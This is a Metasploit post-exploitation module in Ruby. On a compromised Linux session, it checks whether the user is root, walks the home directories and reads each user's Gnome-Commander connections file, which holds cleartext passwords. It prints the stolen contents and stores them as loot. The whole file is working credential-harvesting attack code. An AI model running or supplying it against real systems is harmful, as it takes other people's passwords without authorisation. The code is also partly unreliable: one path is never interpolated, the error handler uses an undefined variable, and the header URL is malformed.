##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Gnome-Commander Creds',
        'Description'   => %q{
          Gnome-commander stores clear text passwords in ~/.gnome-commander/connections file.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
        'Platform'      => %w{ linux },
        'SessionTypes'  => [ 'meterpreter', 'shell']
      ))
  end

  def run
    user_dirs = []
    user = cmd_exec("whoami").chomp
    if (user =~ /root/)
       print_status("Current user is #{user}, probing all home dirs")
       user_dirs << '/root'
       cmd_exec('ls /home').each_line.map { |l| user_dirs << "/home/#{l}".chomp }
    else
       print_status("Current user is #{user}, probing /home/#{user}")
       user_dirs << '/home/#{user}'
    end
    # Try to find connections file in users homes
    user_dirs.each do |dir|
      connections_file = "#{dir}/.gnome-commander/connections"
      unless file?(connections_file)
        # File not found
        print_status("File not found : #{connections_file}")
      else
        begin
          print_good("File found : #{connections_file}")
          print_line(read_file(connections_file))
          p = store_loot("connections", "text/plain", session, read_file(connections_file), "#{connections_file}", "Gnome-Commander connections")
          print_good ("Connections file saved to #{p.to_s}")
          print_line()
        rescue EOFError
          # If there's nothing in the file, we hit EOFError
          print_error("Nothing read from file: #{dbvis_file}, file may be empty")
        end
      end
    end
  end
end
